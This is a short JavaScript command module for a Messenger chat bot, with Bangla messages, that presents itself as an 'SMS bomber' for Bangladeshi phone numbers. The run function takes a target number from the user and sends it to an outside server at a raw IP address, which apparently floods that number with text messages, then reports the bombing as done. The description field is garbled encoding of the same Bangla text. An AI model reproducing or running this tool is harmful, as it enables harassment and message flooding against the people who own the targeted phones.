module.exports.config = {
  name: "sms",
  version: "1.0.0",
  hasPermssion: 2, //DONT CHANGE THIS MODIFIER CREDIT BADOL-KHAN
  credits: "BADOL-KHAN",
  description: "ржПрж╕ржПржоржПрж╕ ржмрзЛржорзНржмрж╛рж░, рж╢рзБржзрзБржорж╛рждрзНрж░ ржмрж╛ржВрж▓рж╛ржжрзЗрж╢рж┐ ржирж╛ржорзНржмрж╛рж░рзЗрж░ ржЬржирзНржп ржкрзНрж░ржпрзЛржЬрзНржп",
  commandCategory: "Tool",
  usages: "/sms number text",
  cooldowns: 15,
  dependencies: {"axios" : ""}
};
module.exports.run = async({api, event, args}) => {
  const axios = require('axios');
  if (args[0]) {
  api.sendMessage(`↔️ একটু ওয়েট করুনএসএমএস বোম্বিং করা হচ্ছে📣`, event.threadID, (err, info) => setTimeout(() => { api.unsendMessage(info.messageID) }, 90000));
  let i1 = (args[0]) //sms bomb api // fixed by TANVIR-TAMIM // dont harm this //
  const res = await axios.get(`http://206.189.134.221/wordpress/wp-content/uploads/bmb/${i1}`);
  return api.sendMessage(`📩এসএমএস বোম্বিং সম্পূর্ন করা হয়েছে📣\n`, event.threadID, event.messageID)
} //modifi credit - fixed by TANVIR-TAMIM
else if (args.join() == "") { 
    return api.sendMessage(`⚠️SMS BOMMING B4D9L-BOT-007⚠️\n\n↔️ আপনি যে নাম্বারে SMS বোম্বিং করতে চান ↔️
☢️BOT PREFIX.দিয়ে নাম্বার টি টাইপ করুন☢️\n\n☣️প্রতিবারে সর্বোচ্চ ৫ টি করে মেসেজ যাবে☣️`, event.threadID, event.messageID)}
    }